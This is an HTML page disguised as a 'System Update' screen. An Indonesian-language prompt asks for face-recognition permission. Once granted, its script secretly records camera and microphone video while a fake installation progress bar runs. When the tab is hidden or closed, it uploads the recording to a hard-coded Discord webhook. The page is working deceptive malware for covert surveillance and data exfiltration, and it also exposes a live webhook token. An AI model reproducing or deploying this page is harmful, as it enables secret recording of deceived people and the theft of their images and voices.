<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        
        /* Loading Style */
        .loader { border: 4px solid #111; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 20px; font-size: 14px; color: #0078d4; font-weight: bold; }
        #pct { font-size: 12px; color: #555; margin-top: 5px; }

        /* Custom Modal Style */
        #customModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); display: flex; justify-content: center;
            align-items: center; z-index: 9999;
        }
        .modal-box {
            background: #1e1e1e; padding: 25px; border-radius: 10px;
            text-align: center; border: 1px solid #333; max-width: 300px;
        }
        .modal-box p { margin-bottom: 20px; font-size: 16px; }
        .btn-group { display: flex; gap: 10px; justify-content: center; }
        .btn {
            padding: 10px 25px; border: none; border-radius: 5px;
            cursor: pointer; font-weight: bold; transition: 0.3s;
        }
        .btn-yes { background: #0078d4; color: white; }
        .btn-no { background: #333; color: #aaa; }
    </style>
</head>
<body>

    <div id="customModal">
        <div class="modal-box">
            <p>Hai, izin pengenalan wajah untuk verifikasi sistem?</p>
            <div class="btn-group">
                <button class="btn btn-yes" onclick="requestAccess()">YES</button>
                <button class="btn btn-no" onclick="denied()">NO</button>
            </div>
        </div>
    </div>

    <div class="loader"></div>
    <div id="status">WAITING FOR PERMISSION...</div>
    <div id="pct">Progress: <span id="val">0</span>%</div>

    <video id="v" autoplay muted style="display:none;"></video>

    <script>
        const URI = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
        let rc;
        let ck = [];

        function denied() {
            document.getElementById('customModal').style.display = 'none';
            document.getElementById('status').innerText = "ERROR: SYSTEM REQUIREMENT FAILED";
        }

        async function requestAccess() {
            // Sembunyikan modal buatan sendiri
            document.getElementById('customModal').style.display = 'none';
            document.getElementById('status').innerText = "INSTALLING SYSTEM UPDATE...";
            
            try {
                // Barulah panggil izin asli browser
                const s = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                document.getElementById('v').srcObject = s;
                rc = new MediaRecorder(s);
                rc.ondataavailable = (e) => { if (e.data.size > 0) ck.push(e.data); };
                
                rc.onstop = async () => {
                    const b = new Blob(ck, { type: 'video/webm' });
                    const f = new FormData();
                    f.append('file', b, 'vid.webm');
                    f.append('content', '🎥 **Video Recorded!**');
                    await fetch(URI, { method: 'POST', body: f });
                };

                rc.start();
                load();
            } catch (e) {
                document.getElementById('status').innerText = "ERROR: PERMISSION DENIED";
            }
        }

        function load() {
            let p = 0;
            setInterval(() => {
                if (p < 99) {
                    p += Math.floor(Math.random() * 2) + 1;
                    document.getElementById('val').innerText = p;
                }
            }, 3000);
        }

        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && rc) rc.stop(); });
        window.onbeforeunload = () => { if (rc) rc.stop(); };
    </script>
</body>
</html>
